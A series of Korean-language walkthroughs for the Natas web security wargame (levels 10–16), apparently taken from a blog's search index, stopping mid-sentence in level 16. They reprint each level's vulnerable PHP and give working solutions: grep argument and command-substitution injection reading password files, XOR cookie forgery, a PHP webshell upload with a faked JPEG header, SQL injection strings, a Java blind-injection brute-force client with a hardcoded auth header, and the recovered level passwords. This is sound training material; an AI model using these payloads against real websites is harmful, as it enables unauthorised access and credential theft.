value=Search&gt;&lt;br&gt;&lt;br&gt; &lt;/form&gt; Output: &lt;pre&gt; &lt;? $key = &quot;&quot;; if(array_key_exists(&quot;needle&quot;, $_REQUEST)) { $key = $_REQUEST[&quot;needle&quot;]; } if($key != &quot;&quot;) { if(preg_match('/[;|&amp;]/',$key)) { print &quot;Input contains an illegal character!&quot;; } else { passthru(&quot;grep -i $key dictionary.txt&quot;); } } ?&gt; &lt;/pre&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 소스코드를 보니 [,;,|,&amp;]의 특수문자가 입력되지 않아야 passthru가 실행 된다. 다른 특수문자를 이용한 커맨드 인젝션 문제인줄 알았지만 무수한 삽질 끝에 아니라는 것을 알게 되었다. 그냥 grep을 이용하여 파일의 내용을 출력하는 것이 좋을 것 같다.문법을 맞추기만 하면 실행되니 다음과 같은 명령어를 입력한다. ‘[a-z]’ /etc/natas_webpass/natas11 a부터 z가 포함된 문자열을 /etc/natas_webpass/natas11에서 추출되게 하는 것이다. 파일 경로는 전단계에서 사용하던 경로를 통해 유추를 할 수 있다. level11의 패스워드를 찾았다! U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK","link":"/2022/01/20/Natas/natas10/"},{"title":"Natas 워게임 level11 풀이","text":"Level Goal Cookies are protected with XOR encryptionBackground color 쿠키는 XOR 암호화로 보호됩니다. 배경색 Username: natas11URL: http://natas11.natas.labs.overthewire.org 쿠기가 XOR 암호화로 보호 되어있다고 한다.아마 XOR 관련문제 인것 같다. 입력한 색상코드로 배경색을 바꿔주는 입력창과소스코드 하이퍼 링크가 있다. 소스 코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas11&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;? $defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;); // 초기값 function xor_encrypt($in) { $key = '&lt;censored&gt;'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { global $_COOKIE; $mydata = $def; //$defaultdata불러오기 if(array_key_exists(&quot;data&quot;, $_COOKIE)) { 쿠기값에서 data키나 인덱스가 있다면 $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true); json형식의 문자열에서 배열로 바꾼다. (쿠기값) if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) { //tempdata가 배열이면서 tempdata에 showpassword키와 bgcolor키가 있다면 if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { // tempdata의 bgcolor 값에 맨 앞에 #이 붙고 a~f(숫자포함)의 6자리가 오는 패턴이 보인다면 $mydata['showpassword'] = $tempdata['showpassword']; //$defaultdata값에 있던 showpassword값을 tempdata에 있는 showpassword로 변경 $mydata['bgcolor'] = $tempdata['bgcolor']; //$defaultdata값에 있던 bgcolor값을 tempdata에 있는 bgcolor로 변경 } } } return $mydata; } function saveData($d) { setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) { $data['bgcolor'] = $_REQUEST['bgcolor']; } } saveData($data); ?&gt; &lt;h1&gt;natas11&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;body style=&quot;background: &lt;?=$data['bgcolor']?&gt;;&quot;&gt; Cookies are protected with XOR encryption&lt;br/&gt;&lt;br/&gt; &lt;? if($data[&quot;showpassword&quot;] == &quot;yes&quot;) { //showpassword 값이 yes라면 패스워드 출력 print &quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;; } ?&gt; &lt;form&gt; Background color: &lt;input name=bgcolor value=&quot;&lt;?=$data['bgcolor']?&gt;&quot;&gt; &lt;input type=submit value=&quot;Set color&quot;&gt; &lt;/form&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 쿠기값에서 showpassword값을 no의 yes로 바꾸어 주면 될 것 같다. 쿠기값 : - ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw 쿠기값을 복호화 하려고 했지만 XOR 키값을 몰라 진행이 안된다. 무수한 삽질 끝에 포기하고 답지를 보았다.그리고 알아냈다.XOR의 특성을 이용하면 된다!!!!!!!!!!! a ^ b = ca ^ c = b 이 특성을 XOR암호화 함수에 대입하면 $defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;); function xor_encrypt($in) { $key = '&lt;censored&gt;'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function saveData($d) { setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); saveData($data); text ^ key = out text a ^ b = c json_encode($defaultdata) ^ key = ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw a ^ c = b json_encode($defaultdata) ^ ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw = key 이를 통해 key값을 찾아낸다. 원래 있던 코드를 고치면 편하기에 온라인 php실행기에서 진행하였다. &lt;?php function xor_encrypt() { $defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;); $text = base64_decode(&quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&quot;); $outText = json_encode($defaultdata); $key=''; for($i=0;$i&lt;strlen($text);$i++) { $key .= $outText[$i] ^ $text[$i % strlen($text)]; } return $key; } print xor_encrypt(); ?&gt; qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq qw8J가 반복되고 있다.아마 키는 qw8J인것 같다. key = qw8J 키값을 찾아냈다. 키값을 찾았으니 showpassword값이 yes인 상태에서의 쿠기값을 찾으면 된다. &lt;?php function xor_encrypt() { $defaultdata = array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;); $key = 'qw8J'; $text = json_encode($defaultdata); $outText = ''; for($i=0;$i&lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return base64_encode($outText); } print xor_encrypt(); ?&gt; ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK 쿠기값을 변경하여 요청을 보내면 끝이다. level12의 패스워드를 찾았다! EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3","link":"/2022/01/20/Natas/natas11/"},{"title":"Natas 워게임 level12 풀이","text":"Level Goal Choose a JPEG to upload (max 1KB) 업로드할 JPEG 선택(최대 1KB) Username: natas12URL: http://natas12.natas.labs.overthewire.org 파일을 업로드할 수 있는 버튼과 소스코드 하이퍼 링크가 있다. 소스코드를 본다! &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas12&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas12&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? function genRandomString() { //10자리 랜덤의 파일 이름 생성 $length = 10; $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;; $string = &quot;&quot;; for ($p = 0; $p &lt; $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { //랜덤으로 생성된 파일의 경로를 지정하고 확장자 붙이기 do { $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { //파라미터로 받은 값에서 확장자 추출 $ext = pathinfo($fn, PATHINFO_EXTENSION); //PATHINFO_EXTENSION:파일 확장자 추출 return makeRandomPath($dir, $ext); } if(array_key_exists(&quot;filename&quot;, $_POST)) { $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]); if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) { echo &quot;File is too big&quot;; } else { if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { //파일을 임시 폴더에 옮긴다음 target_path로 다시 옮김 echo &quot;The file &lt;a href=\\&quot;$target_path\\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;; } else{ echo &quot;There was an error uploading the file, please try again!&quot;; } } } else { ?&gt; &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt; //랜덤으로 생성한 이름에 확장자 추가 Choose a JPEG to upload (max 1KB):&lt;br/&gt; &lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 이번 문제는 파일 업로드를 이용한 문제 인것 같다.passthru를 이용하면 php에서 시스템 명령어를 실행하고 출력할 수 있다. 외부 프로그램을 실행하고 실행되는 동안 화면을 실시간으로 출력하는 함수 다음과 같은 php파일을 만든다. &lt;?php passthru(&quot;cat /etc/natas_webpass/natas13&quot;) ?&gt; 이제 파일을 업로드 해본다. 하지만 실행이 되지않는다. 소스코드 아래 쪽을 보면 어떠한 확장자를 붙인 파일을 올려도 이름을 랜덤으로 생성하고 .jpg를 붙여서 요청을 한다. jpg로 열리기에 제대로 실행되지 않는다. 확장자에 대한 필터가 없기에요청할때 확장자를 바꾸어 요청하면 될 거 같다. 확장자가 제대로 원하는대로 바뀌었다. 파일을 열어 본다. level13의 패스워드를 찾았다! jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY","link":"/2022/01/21/Natas/natas12/"},{"title":"Natas 워게임 level13 풀이","text":"Level Goal For security reasons, we now only accept image files!Choose a JPEG to upload (max 1KB) 보안상의 이유로 이제 이미지 파일만 받습니다! 업로드할 JPEG 선택(최대 1KB) Username: natas13URL: http://natas13.natas.labs.overthewire.org 이번엔 전단계와 비슷하지만 이미지 파일만 받도록 되어 있다고 한다. 소스코드를 본다! &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas13&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas13&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; For security reasons, we now only accept image files!&lt;br/&gt;&lt;br/&gt; &lt;? function genRandomString() { $length = 10; $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;; $string = &quot;&quot;; for ($p = 0; $p &lt; $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { do { $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext); } if(array_key_exists(&quot;filename&quot;, $_POST)) { $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]); $err=$_FILES['uploadedfile']['error']; if($err){ if($err === 2){ //값 뿐만 아니라 데이터 타입도 2라면 (이미지의 데이터 타입 값은 2다.) echo &quot;The uploaded file exceeds MAX_FILE_SIZE&quot;; } else{ echo &quot;Something went wrong :/&quot;; } } else if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) { echo &quot;File is too big&quot;; } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { //이미지가 아니라면 &gt; exif_imagetype : 이미지의 첫 바이트를 읽고 서명을 확인합니다. echo &quot;File is not an image&quot;; } else { if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { echo &quot;The file &lt;a href=\\&quot;$target_path\\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;; } else{ echo &quot;There was an error uploading the file, please try again!&quot;; } } } else { ?&gt; &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt; Choose a JPEG to upload (max 1KB):&lt;br/&gt; &lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 기존 소스코드에 이번에 파일을 업로드 해도 이미지 파일이 아니라면 업로드가 안되는 코드가 추가되었다. exif_imagetype를 통해 파일의 코드를 읽어 jpg인지 아닌지 확인한다.그렇다면 jpg 파일코드 즉 jpg 시그니처 코드를 붙이면 될 것 같다. 파일시그니처란파일 형식마다 가지고 있는 고유의 특징, 포맷에 대한 정보 jpg 시그니처 코드는 다음과 같다. 헤더 시그니처 푸터 시그니처 FF D8 FF E0FF D8 FF E8 FF D9 이를 HxD프로그램을 이용하여 전단계에서 만든 파일에 수정한 뒤 시그니처를 넣어준다. 이를 업로드 해본다. 전단계와 같이 요청할때 파일의 확장자를 .php로 바꾸어 준다. php파일인데 파일이 제대로 업로드 되었다.파일을 실행해본다. level14의 패스워드를 찾았다! Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1","link":"/2022/01/22/Natas/natas13/"},{"title":"Natas 워게임 level14 풀이","text":"Level Goal Username:Password: 사용자 이름: 비밀번호: Username: natas14URL: http://natas14.natas.labs.overthewire.org 일단 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas14&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas14&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? if(array_key_exists(&quot;username&quot;, $_REQUEST)) { $link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;'); mysql_select_db('natas14', $link); $query = &quot;SELECT * from users where username=\\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\\&quot; and password=\\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\\&quot;&quot;; if(array_key_exists(&quot;debug&quot;, $_GET)) { echo &quot;Executing query: $query&lt;br&gt;&quot;; } if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) { echo &quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;; } else { echo &quot;Access denied!&lt;br&gt;&quot;; } mysql_close($link); } else { ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt; Password: &lt;input name=&quot;password&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 유저이름과 패스워드를 입력받아 데이터베이스와 일치하는 값이 있으면 natas15의 패스워드를 출력해준다. natas15 패스워드를 출력하기 위해선 natas15의 패스워드를 알아야한다. 참 모순적이다. 아마 sql injection을 이용해 문제를 풀어야 되는 것 같다. 쿼리구문에서 유저 이름과 패스워드를 입력받아 select문을 실행하는데필터링 없이 문자열을 그래도 갖고와 실행하고 있다. 문법만 맞춘다면 패스워드를 몰라도 명령어를 실행해 패스워드를 얻어낼수 있다. 다음과 같이 유저 이름 부분에만 입력한다. “ or 1 = 1 # (“를 사용해 입력 부분을 닫아주고 or 1=1을 사용하여 참이 되게한다. 다음 # 주석을 사용하여 뒤 부분이 실행되지 않도록 한 것이다. ) 이를 실행하면 natas15의 패스워드가 출력된다. level15의 패스워드를 찾았다! AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J","link":"/2022/01/23/Natas/natas14/"},{"title":"Natas 워게임 level15 풀이","text":"Level Goal Username:check existence 사용자 이름: 존재 확인 Username: natas15URL: http://natas15.natas.labs.overthewire.org 유저 이름을 입력하면 해당유저가 존재하는지 확인해주는 것 같다. 일단 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas15&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas15&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(&quot;username&quot;, $_REQUEST)) { $link = mysql_connect('localhost', 'natas15', '&lt;censored&gt;'); mysql_select_db('natas15', $link); $query = &quot;SELECT * from users where username=\\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\\&quot;&quot;; if(array_key_exists(&quot;debug&quot;, $_GET)) { echo &quot;Executing query: $query&lt;br&gt;&quot;; } $res = mysql_query($query, $link); //쿼리가 실행됬면 참 쿼리가 실행되지 않으면 거짓 if($res) { if(mysql_num_rows($res) &gt; 0) { //쿼리를 실행해서 나온 레코드 갯수를 카운트해서 0이상이면 echo &quot;This user exists.&lt;br&gt;&quot;; } else { echo &quot;This user doesn't exist.&lt;br&gt;&quot;; } } else { echo &quot;Error in query.&lt;br&gt;&quot;; } mysql_close($link); } else { ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Check existence&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 유저이름을 입력하면 존재유무만 출력할 뿐 패스워드의 정보는 주지 않는다.하지만 조건에 충족하기만 한다면 존재유무를 알려주기 때문에 하나씩 실행하면서 확인해 보면 될 것 같다. 먼저 natas16이 존재하는지 확인한다. natas16 육안으로 구별하기 위해 get방식으로도 해보았다. 그냥 유저 이름 입력란을 사용해도 무관하다. natas16이 있는걸 확인했다.다시 소스코드를 돌아가면 users테이블에 username말고도 password컬럼도 있다. 혹시 패스워드가 NULL값으로 되어 있는지 확인해 보았다. natas16” AND NOT password IS NULL# 당연하게도 null값이 아니었다.이제 패스워드의 존재를 알았으니 길이를 알아내면 될것 같다. 패스워드의 길이를 하나씩 바꿔가면 노가다를 하여 길이가 32라는 것을 알아내었다. natas16” and length(password)=32# 여기까진 괜찮은데 32개 패스워드를 하나씩 대입해 알아내기엔 너무 많은 경우의 수가 있어서 불가능하다.하지만 나는 소켓 프로그래밍은 처음(응애 나 아기 초보)이라 일단 대략적인 틀은 복사하고 필요한 부분을 추가하여 넣었다.. 출처 : https://atoz-develop.tistory.com/entry/JAVA-TCP-%EC%86%8C%EC%BC%93-%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%B0%8D%EC%9C%BC%EB%A1%9C-%EA%B0%84%EB%8B%A8%ED%95%9C-HTTP-%ED%81%B4%EB%9D%BC%EC%9D%B4%EC%96%B8%ED%8A%B8-%EA%B5%AC%ED%98%84%ED%95%98%EA%B8%B0 import java.io.BufferedReader; import java.io.InputStreamReader; import java.io.PrintStream; import java.net.Socket; public class SimpleHttpClient { public static void main(String[] args) throws Exception { String a= &quot;&quot;; for (int i = 1; i &lt;= 32; i++) { for (int j = 48; j &lt;= 123; j++) { if (58 &lt;= j &amp;&amp; j &lt;= 64) { continue; } if (91 &lt;= j &amp;&amp; j &lt;= 96) { continue; } // 소켓 및 입출력 스트림 준비 Socket socket = new Socket(&quot;176.9.9.172&quot;, 80); BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream())); PrintStream out = new PrintStream(socket.getOutputStream()); // 요청라인 out.println(&quot;GET /index.php?username=natas16%22%20and%20ascii(substr(password,&quot;+ Integer.toString(i) +&quot;,1))=&quot;+ Integer.toString(j) + &quot;%20%23 HTTP/1.1&quot;); // 헤더정보 out.println(&quot;Host: natas15.natas.labs.overthewire.org&quot;); out.println(&quot;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==&quot;); out.println(); // 응답 내용 String line = null; while((line = in.readLine()) != null) { if(line.contains(&quot;This user exists.&quot;)){ a = a+(char)j; in.close(); out.close(); socket.close(); break; } } in.close(); out.close(); socket.close(); } System.out.println(a); } } } 다른 답지를 보니 파이썬을 이용하였는데 아마 더 간단하게 스크립트를 짤수 있어서 그런 것 같다.응애..너무 오래 걸려 중간에 연결이 끊어진다.그럼 i값을 변경하여 다시 돌리면 된다. 아주 오랜 시간이 소요되었다!!! 나온 값을 아스키코드로 다시 변환하면 끝이다!!!!!!! level16의 패스워드를 찾았다! WaIHEacj63wnNIBROHeqi3p9t0m5nhmh","link":"/2022/01/25/Natas/natas15/"},{"title":"Natas 워게임 level16 풀이","text":"Level Goal For security reasons, we now filter even more on certain charactersFind words containing: 보안상의 이유로 이제 특정 문자를 더 많이 필터링합니다. 다음을 포함하는 단어 찾기: Username: natas16URL: http://natas16.natas.labs.overthewire.org 예전에 했던 것과 비슷한것 같다.일단 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas16&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas16&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; For security reasons, we now filter even more on certain characters&lt;br/&gt;&lt;br/&gt; &lt;form&gt; Find words containing: &lt;input name=needle&gt;&lt;input type=submit name=submit value=Search&gt;&lt;br&gt;&lt;br&gt; &lt;/form&gt; Output: &lt;pre&gt; &lt;? $key = &quot;&quot;; if(array_key_exists(&quot;needle&quot;, $_REQUEST)) { $key = $_REQUEST[&quot;needle&quot;]; } if($key != &quot;&quot;) { if(preg_match('/[;|&amp;`\\'&quot;]/',$key)) { print &quot;Input contains an illegal character!&quot;; } else { passthru(&quot;grep -i \\&quot;$key\\&quot; dictionary.txt&quot;); } } ?&gt; &lt;/pre&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 전과는 다르게 백쿼터(`)와 대괄호([])등이 추가로 막혔다. 하지만 걱정하지 말라 백쿼터를 사용하지 않아도 명령어를 대체해서 사용할 수 있는 방법이 있다. $(command) 이와 같은 형식으로 입력하면 된다. 이때 /와 같은 특수문자를 사용해도 필터링에 걸리지 않는다.$(cat /etc/natas_webpass/natas17)을 해봤지만 문법이 안맞는지 실행은 되지 않았다. grep을 사용해서 푸는 문제인 것 같다. $$(grep ^a(임의문자) 